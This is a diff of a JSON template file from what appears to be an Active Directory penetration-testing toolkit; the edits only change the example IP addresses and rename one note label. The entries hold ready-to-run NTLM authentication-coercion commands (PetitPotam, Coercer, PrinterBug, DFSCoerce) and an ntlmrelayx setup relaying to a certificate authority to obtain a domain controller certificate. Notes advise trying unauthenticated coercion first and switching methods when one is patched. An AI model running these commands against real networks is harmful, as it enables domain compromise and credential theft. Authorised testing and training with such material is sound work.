@@ -28,13 +28,13 @@
         {
           "name": "<LISTENER_IP>",
           "description": "Attacker IP running ntlmrelayx/responder",
-          "example": "192.168.50.100",
+          "example": "10.10.10.100",
           "required": true
         },
         {
           "name": "<TARGET_IP>",
           "description": "Target server to coerce",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         }
       ],
@@ -73,8 +73,8 @@
         "STATUS_ACCESS_DENIED": "Try with credentials or different target",
         "Connection refused": "Target port 445 not accessible"
       },
-      "notes": "PETITPOTAM ATTACK:\nExploits EfsRpcOpenFileRaw to force target to authenticate to attacker.\n\nUSE CASES:\n1. ADCS Relay (ESC8): Coerce DC to attacker \u2192 relay to CA \u2192 get DC cert\n2. Unconstrained Delegation: Coerce to host with unconstrained delegation to capture TGT\n3. LDAP Relay: Relay to DC for RBCD or shadow credentials\n\nSETUP FOR ADCS RELAY:\n# Terminal 1: Start relay\nntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# Terminal 2: Trigger coercion\npython3 PetitPotam.py <attacker_ip> <dc_ip>\n\nNULL SESSION:\nTry without credentials first - many DCs allow unauthenticated coercion.\n\ncertification TIP:\nPetitPotam + ADCS relay is a high-impact attack chain for domain compromise.",
-      "filled_example": "python3 PetitPotam.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' 192.168.50.100 192.168.50.70"
+      "notes": "PETITPOTAM ATTACK:\nExploits EfsRpcOpenFileRaw to force target to authenticate to attacker.\n\nUSE CASES:\n1. ADCS Relay (ESC8): Coerce DC to attacker \u2192 relay to CA \u2192 get DC cert\n2. Unconstrained Delegation: Coerce to host with unconstrained delegation to capture TGT\n3. LDAP Relay: Relay to DC for RBCD or shadow credentials\n\nSETUP FOR ADCS RELAY:\n# Terminal 1: Start relay\nntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# Terminal 2: Trigger coercion\npython3 PetitPotam.py <attacker_ip> <dc_ip>\n\nNULL SESSION:\nTry without credentials first - many DCs allow unauthenticated coercion.\n\nPRACTICAL TIP:\nPetitPotam + ADCS relay is a high-impact attack chain for domain compromise.",
+      "filled_example": "python3 PetitPotam.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' 10.10.10.100 10.10.10.70"
     },
     {
       "id": "coercer-coerce",
@@ -104,13 +104,13 @@
         {
           "name": "<LISTENER_IP>",
           "description": "Attacker listener IP",
-          "example": "192.168.50.100",
+          "example": "10.10.10.100",
           "required": true
         },
         {
           "name": "<TARGET_IP>",
           "description": "Target server IP",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         }
       ],
@@ -151,7 +151,7 @@
         "All methods failed": "Target may be patched or methods blocked"
       },
       "notes": "COERCER ADVANTAGE:\nTests ALL known coercion methods automatically:\n- MS-EFSR (PetitPotam)\n- MS-RPRN (PrinterBug/SpoolSample)\n- MS-FSRVP (ShadowCoerce)\n- MS-DFSNM (DFSCoerce)\n\nThis is better than running individual tools.\n\nUSE CASE:\nWhen PetitPotam is patched, Coercer will find alternative working methods.",
-      "filled_example": "coercer coerce -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' -l 192.168.50.100 -t 192.168.50.70"
+      "filled_example": "coercer coerce -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' -l 10.10.10.100 -t 10.10.10.70"
     },
     {
       "id": "printerbug-trigger",
@@ -181,13 +181,13 @@
         {
           "name": "<TARGET_IP>",
           "description": "Target server with Print Spooler",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         },
         {
           "name": "<LISTENER_IP>",
           "description": "Attacker listener IP",
-          "example": "192.168.50.100",
+          "example": "10.10.10.100",
           "required": true
         }
       ],
@@ -219,7 +219,7 @@
         "Print Spooler not running": "Service disabled on target - try different method"
       },
       "notes": "PRINTERBUG (MS-RPRN):\nAbuses RpcRemoteFindFirstPrinterChangeNotificationEx to force authentication.\n\nREQUIRES:\n- Print Spooler service running on target (default on most Windows)\n- Valid domain credentials\n\nOLDER BUT RELIABLE:\nPetitPotam may be patched, but PrinterBug often still works.",
-      "filled_example": "python3 printerbug.py 'corp.local/user:P@ssw0rd123!@192.168.50.70' 192.168.50.100"
+      "filled_example": "python3 printerbug.py 'corp.local/user:P@ssw0rd123!@10.10.10.70' 10.10.10.100"
     },
     {
       "id": "dfscoerce-trigger",
@@ -249,13 +249,13 @@
         {
           "name": "<LISTENER_IP>",
           "description": "Attacker listener IP",
-          "example": "192.168.50.100",
+          "example": "10.10.10.100",
           "required": true
         },
         {
           "name": "<TARGET_IP>",
           "description": "Target server IP",
-          "example": "192.168.50.70",
+          "example": "10.10.10.70",
           "required": true
         }
       ],
@@ -291,7 +291,7 @@
         "DFS not available": "Target does not have DFS role"
       },
       "notes": "DFSCOERCE:\nAlternative coercion method using Distributed File System.\n\nUSE WHEN:\n- PetitPotam patched\n- Print Spooler disabled\n- Target has DFS role installed",
-      "filled_example": "python3 dfscoerce.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' 192.168.50.100 192.168.50.70"
+      "filled_example": "python3 dfscoerce.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' 10.10.10.100 10.10.10.70"
     },
     {
       "id": "ntlmrelayx-adcs",
